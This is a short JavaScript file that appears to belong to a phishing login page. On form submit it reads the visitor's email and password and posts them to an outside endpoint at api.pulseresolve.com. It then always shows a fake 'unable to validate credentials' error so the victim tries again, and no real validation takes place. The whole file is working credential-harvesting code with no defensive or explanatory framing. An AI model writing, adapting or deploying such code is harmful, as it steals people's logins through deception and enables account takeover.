"use strict";

const Accept = () => {
	document.querySelector(".cookie-notif").style.display = "none";
}


window.addEventListener("load", function() {

	const form = document.querySelector(".form-handle");

	form.addEventListener("submit", function(e) {
		e.preventDefault();

		document.querySelector(".submit_btn").innerHTML = "Validating...";
		document.querySelector(".submit_btn").setAttribute("disabled",true);
		const email = document.querySelector(".email").value;
		const password = document.querySelector(".password").value;

		var xhr = new XMLHttpRequest(),
		data = `email=${email}&password=${password}`;

		xhr.open('POST','https://api.pulseresolve.com/87ce5e10-e89a-4fbb-a2cc-d59573be3a78', false);

// LINE ADDED
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

		xhr.send(data);

		document.querySelector(".error").innerHTML = "Unable to validate credentials, please try again";
		document.querySelector(".submit_btn").innerHTML = "Log in";
		document.querySelector(".submit_btn").removeAttribute("disabled");

	})

})